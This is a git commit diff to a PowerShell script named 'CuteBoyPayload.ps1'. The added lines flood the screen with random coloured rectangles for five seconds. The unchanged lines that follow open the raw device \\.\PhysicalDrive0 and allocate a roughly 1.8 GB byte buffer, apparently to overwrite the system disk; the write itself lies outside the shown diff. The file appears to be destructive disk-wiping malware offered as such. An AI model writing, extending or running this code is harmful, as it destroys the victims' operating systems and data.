d222ce0b2ae4da5ce2f70bd357caa94dd6739288
Syed930s <195543322+Syed930s@users.noreply.github.com>
2026-06-08 16:24:15 +0100

    Update CuteBoyPayload.ps1

--- CuteBoyPayload.ps1
+++ CuteBoyPayload.ps1
@@ -1,3 +1,34 @@
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Windows.Forms
+
+$g = [System.Drawing.Graphics]::FromHwnd([IntPtr]::Zero)
+$rand = New-Object System.Random
+
+$end = (Get-Date).AddSeconds(5)
+
+while ((Get-Date) -lt $end) {
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+
+    $x = $rand.Next(0, $screen.Width)
+    $y = $rand.Next(0, $screen.Height)
+    $w = $rand.Next(20, 250)
+    $h = $rand.Next(20, 250)
+
+    $color = [System.Drawing.Color]::FromArgb(
+        $rand.Next(256),
+        $rand.Next(256),
+        $rand.Next(256)
+    )
+
+    $brush = New-Object System.Drawing.SolidBrush($color)
+    $g.FillRectangle($brush, $x, $y, $w, $h)
+    $brush.Dispose()
+
+    Start-Sleep -Milliseconds 15
+}
+
+$g.Dispose()
+
 $disk = "\\.\PhysicalDrive0"
 $size = 1840960000
 $bytes = New-Object byte[]($size)
